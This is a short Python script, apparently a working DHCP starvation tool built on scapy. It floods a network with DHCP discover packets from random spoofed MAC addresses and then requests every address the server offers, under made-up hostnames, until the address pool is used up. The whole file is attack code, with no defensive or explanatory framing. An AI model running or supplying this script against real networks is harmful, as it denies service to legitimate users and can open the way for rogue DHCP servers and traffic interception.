from scapy.all import *
import random
import time 
from threading import Thread 
import socket
import struct 
from queue import Queue 
q1 = Queue()
s = socket.socket(socket.PF_PACKET,socket.SOCK_RAW,socket.ntohs(0x0800))
def DHCP_discover():
	while True:
		try :
			m1  =RandMAC()._fix()
			#m1 =RandString(12,b"123456789abcdef")
			tid = random.randint(100,300)
			eth1 = Ether(src=m1,dst="ff:ff:ff:ff:ff:ff")
			#print ("m11", m1)
			ip1 = IP(src='0.0.0.0',dst="255.255.255.255")
			udp1 = UDP(sport=68,dport=67)
			#bootp1 = BOOTP(chaddr=RandString(12,b"123456789abcdef"),xid=tid)
			bootp1 = BOOTP(chaddr=m1,xid=tid)
			dhcp1 = DHCP(options=[('message-type','discover'),('hostname','mohitraj'),"end"])
			dhcp_discover = eth1/ip1/udp1/bootp1/dhcp1
			#print ("m1", m1)
			sendp(dhcp_discover,iface='ens33')
			time.sleep(2)
			q1.put((eth1,ip1,udp1,bootp1,tid))

		except Exception as e :
			print (e)

def DHCP_offer_accept_send_request():
	i =0
	while True :
		try:
			pkt = s.recvfrom(2048)
			num = int(f'{pkt[0][14]:x}')
			ip_length = (num%10)*4
			ip_last_range = 14+ip_length
			ipheader = pkt[0][14:ip_last_range]
			ip_hdr = struct.unpack("!12s4s4s",ipheader)
			server_ip = socket.inet_ntoa(ip_hdr[1])
			obtained_ip = socket.inet_ntoa(ip_hdr[2])
			port_numbers = struct.unpack("!H",pkt[0][ip_last_range:ip_last_range+2])
			p1 = port_numbers[0]
			if p1==67:
				eth1,ip1,udp1,bootp1,tid = q1.get()
				print ("Obtained IP", obtained_ip)
				print ("server_ip", server_ip)
				dhcp1 = DHCP(options=[("message-type", "request")])
				dhcp_request = eth1/ip1/udp1/bootp1/dhcp1
				dhcp_request[BOOTP].xid = tid 
				name = "mohit_"+str(i)
				i=i+1 
				#dhcp_request[DHCP].options.append(("message-type", "request"))
				dhcp_request[DHCP].options.append(("requested_addr", obtained_ip))
				dhcp_request[DHCP].options.append(("server_id", server_ip))
				dhcp_request[DHCP].options.append(("hostname", name))
				dhcp_request[DHCP].options.append(("end"))
				sendp(dhcp_request,iface='ens33')

		except Exception as e :
			print(e)


t1 = Thread(target=DHCP_discover)
t2 = Thread(target=DHCP_offer_accept_send_request)

t1.start()
t2.start()







